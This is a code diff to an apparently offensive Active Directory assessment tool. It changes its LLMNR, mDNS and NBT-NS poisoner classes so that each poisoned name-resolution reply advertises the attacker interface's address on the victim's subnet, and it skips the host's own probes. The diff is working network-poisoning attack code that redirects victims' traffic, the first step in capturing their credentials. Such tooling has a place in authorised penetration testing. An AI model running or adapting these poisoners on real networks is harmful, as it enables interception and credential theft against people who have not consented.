@@ -87,6 +87,27 @@ def _interface_primary_ipv4(interface_name: str) -> str | None:
     return pal_net.interface_ipv4_for(interface_name)
 
 
+def _interface_ipv4_addresses(interface_name: str) -> list[str]:
+    """Return every IPv4 address bound to ``interface_name`` (possibly empty)."""
+
+    from adscan_core.pal import net as pal_net
+
+    try:
+        return list(pal_net.interface_ipv4_addresses_for(interface_name) or [])
+    except Exception:  # noqa: BLE001 - an unreadable NIC answers with the primary
+        return []
+
+
+def _kernel_source_toward(victim_ip: str) -> str | None:
+    """The source address the kernel would use toward ``victim_ip`` (or ``None``)."""
+
+    from adscan_internal.services.listener_ip import (  # noqa: PLC0415
+        kernel_source_ip_toward,
+    )
+
+    return kernel_source_ip_toward(victim_ip)
+
+
 def _should_respond(
     config: PoisonerConfig,
     *,
@@ -132,7 +153,36 @@ class _Poisoner:
             config.interface_name
         )
         self._our_ipv6 = config.our_ipv6
+        self._interface_ipv4s = frozenset(
+            _interface_ipv4_addresses(config.interface_name)
+        ) | ({self._our_ipv4} if self._our_ipv4 else set())
         self._raw_socket = None  # set in start() after asysocks binds
+
+    def _advertise_ipv4_for(self, victim_ip: str) -> str | None:
+        """Return the address to put in the poisoned answer for ``victim_ip``.
+
+        An explicitly configured address (an operator declaration) always wins.
+        Otherwise the victim gets the address of THIS interface that the kernel
+        uses as the source toward it, which is the address on the victim's own
+        subnet when the interface carries several. When that route leaves by
+        another interface (a routed victim), the interface's primary address is
+        the honest answer, as before.
+        """
+
+        if self._config.our_ipv4:
+            return self._config.our_ipv4
+        try:
+            source = _kernel_source_toward(victim_ip)
+        except Exception:  # noqa: BLE001 - inconclusive, answer with the primary
+            source = None
+        if source and source in self._interface_ipv4s:
+            return source
+        return self._our_ipv4
+
+    def _is_own_address(self, ip: str) -> bool:
+        """True for any address of this interface (never poison our own probes)."""
+
+        return ip in self._interface_ipv4s
 
     async def start(self) -> None:
         """Bind the socket and start the dispatch loop."""
@@ -234,12 +284,15 @@ class LLMNRPoisoner(_Poisoner):
         if query is None:
             return
         victim_ip = addr[0].replace("::ffff:", "")
-        if not _should_respond(self._config, our_ipv4=self._our_ipv4, victim_ip=victim_ip, queried_name=query.name):
+        if self._is_own_address(victim_ip):
+            return
+        our_ipv4 = self._advertise_ipv4_for(victim_ip)
+        if not _should_respond(self._config, our_ipv4=our_ipv4, victim_ip=victim_ip, queried_name=query.name):
             return
         ttl = self._config.ttl_seconds if self._config.ttl_seconds is not None else 30
         reply = build_llmnr_response(
             query,
-            our_ipv4=self._our_ipv4,
+            our_ipv4=our_ipv4,
             our_ipv6=self._our_ipv6,
             ttl_seconds=ttl,
         )
@@ -266,12 +319,15 @@ class MDNSPoisoner(_Poisoner):
         if query is None:
             return
         victim_ip = addr[0].replace("::ffff:", "")
-        if not _should_respond(self._config, our_ipv4=self._our_ipv4, victim_ip=victim_ip, queried_name=query.name):
+        if self._is_own_address(victim_ip):
+            return
+        our_ipv4 = self._advertise_ipv4_for(victim_ip)
+        if not _should_respond(self._config, our_ipv4=our_ipv4, victim_ip=victim_ip, queried_name=query.name):
             return
         ttl = self._config.ttl_seconds if self._config.ttl_seconds is not None else 120
         reply = build_mdns_response(
             query,
-            our_ipv4=self._our_ipv4,
+            our_ipv4=our_ipv4,
             our_ipv6=self._our_ipv6,
             ttl_seconds=ttl,
         )
@@ -298,15 +354,18 @@ class NBTNSPoisoner(_Poisoner):
         if query is None:
             return
         victim_ip = addr[0].replace("::ffff:", "")
-        if not _should_respond(self._config, our_ipv4=self._our_ipv4, victim_ip=victim_ip, queried_name=query.name):
+        if self._is_own_address(victim_ip):
             return
-        if self._our_ipv4 is None:
+        our_ipv4 = self._advertise_ipv4_for(victim_ip)
+        if not _should_respond(self._config, our_ipv4=our_ipv4, victim_ip=victim_ip, queried_name=query.name):
+            return
+        if our_ipv4 is None:
             return  # NBT-NS is IPv4-only — can't respond without an IPv4.
         ttl = (
             self._config.ttl_seconds if self._config.ttl_seconds is not None else 165
         )
         reply = build_nbtns_response(
-            query, our_ipv4=self._our_ipv4, ttl_seconds=ttl
+            query, our_ipv4=our_ipv4, ttl_seconds=ttl
         )
         if self._raw_socket is not None:
             self._raw_socket.sendto(reply, addr)
